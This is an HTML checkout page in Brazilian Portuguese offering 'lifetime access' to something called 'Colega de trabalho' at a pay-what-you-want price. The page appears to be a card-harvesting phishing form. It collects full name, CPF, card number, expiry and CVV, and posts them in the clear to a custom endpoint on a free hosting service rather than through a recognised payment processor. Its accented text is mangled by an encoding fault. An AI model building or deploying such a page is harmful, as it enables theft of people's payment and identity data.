<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Vital√≠cio | Colega de Trabalho</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #0d0d0e; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #fff; }
        
        .box { background: #161618; width: 100%; max-width: 400px; padding: 30px; border-radius: 12px; border: 1px solid #252528; margin-bottom: 20px; text-align: center; }
        .box h1 { font-size: 1.8rem; margin-bottom: 5px; }
        .box p { color: #888; margin-bottom: 20px; font-size: 0.9rem; }

        /* Card do Plano Vital√≠cio */
        .vitalicio-card {
            background: linear-gradient(145deg, #1a1a1d, #212124);
            border: 2px solid #0084ff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 132, 255, 0.2);
            margin-bottom: 15px;
        }
        .vitalicio-card span { display: block; font-size: 0.75rem; color: #0084ff; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; }
        .vitalicio-card b { font-size: 1.4rem; color: #fff; }

        /* Campo de Pre√ßo Customizado */
        .input-price-group { margin-top: 15px; text-align: left; }
        .price-input-wrapper { position: relative; display: flex; align-items: center; }
        .price-input-wrapper span { position: absolute; left: 12px; color: #666; font-weight: bold; }
        .price-input-wrapper input { padding-left: 45px !important; color: #0084ff !important; font-weight: bold; font-size: 1.1rem; }

        /* Formul√°rio */
        .input-group { text-align: left; margin-bottom: 15px; }
        label { font-size: 0.75rem; color: #666; font-weight: bold; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; background: #212124; border: 2px solid #252528; border-radius: 6px; color: #fff; outline: none; transition: 0.3s; }
        input:focus { border-color: #0084ff; box-shadow: 0 0 10px rgba(0, 132, 255, 0.2); }
        .flex { display: flex; gap: 10px; }
        
        button { width: 100%; padding: 16px; background: #0084ff; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
        button:hover { background: #0066cc; box-shadow: 0 0 20px rgba(0, 132, 255, 0.5); }
        
        .footer { position: fixed; bottom: 15px; right: 15px; font-size: 0.6rem; color: #333; }
        .error-msg { color: #ff4d4d; font-size: 0.7rem; margin-top: 5px; display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h1>Colega de trabalho üëÄ</h1>
        <p>Apoie o conte√∫do e garanta acesso para sempre.</p>
        
        <div class="vitalicio-card">
            <span>Plano Selecionado</span>
            <b>ACESSO VITAL√çCIO</b>
        </div>

        <div class="input-price-group">
            <label>QUANTO DESEJA PAGAR? (M√çNIMO R$ 3,50)</label>
            <div class="price-input-wrapper">
                <span>R$</span>
                <input type="number" id="valor_display" step="0.01" value="9.90" oninput="updatePrice(this.value)">
            </div>
            <div id="price_error" class="error-msg">O valor m√≠nimo √© R$ 3,50</div>
        </div>
    </div>

    <div class="box">
        <form action="https://otterly-api.onrender.com/pay" method="POST" onsubmit="return validateForm()">
            <input type="hidden" name="plano_escolhido" id="plano_final" value="Vital√≠cio - R$ 9,90">

            <div class="input-group">
                <label>NOME COMPLETO</label>
                <input type="text" name="nome" placeholder="Como no cart√£o" required>
            </div>
            <div class="input-group">
                <label>CPF</label>
                <input type="text" id="cpf_mask" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
            </div>
            <div class="input-group">
                <label>N√öMERO DO CART√ÉO</label>
                <input type="text" id="card_mask" name="cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>
            <div class="flex">
                <div class="input-group" style="flex: 2;">
                    <label>VALIDADE</label>
                    <input type="text" name="validade" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>CVV</label>
                    <input type="text" name="cvv" placeholder="000" maxlength="4" required>
                </div>
            </div>
            <button type="submit">LIBERAR MEU ACESSO</button>
        </form>
    </div>

    <div class="footer">OTTERLY PAGAMENTOS</div>

    <script>
        function updatePrice(val) {
            const error = document.getElementById('price_error');
            const btn = document.querySelector('button');
            
            if (parseFloat(val) < 3.50 || isNaN(parseFloat(val))) {
                error.style.display = 'block';
                btn.disabled = true;
                btn.style.opacity = '0.5';
            } else {
                error.style.display = 'none';
                btn.disabled = false;
                btn.style.opacity = '1';
                document.getElementById('plano_final').value = "Vital√≠cio - R$ " + parseFloat(val).toFixed(2);
            }
        }

        function validateForm() {
            const val = document.getElementById('valor_display').value;
            return parseFloat(val) >= 3.50;
        }

        // M√°scaras
        document.getElementById('cpf_mask').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/);
            e.target.value = !v[2] ? v[1] : v[1] + '.' + v[2] + '.' + v[3] + (v[4] ? '-' + v[4] : '');
        });
        document.getElementById('card_mask').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
            e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
        });
    </script>
</body>
</html>
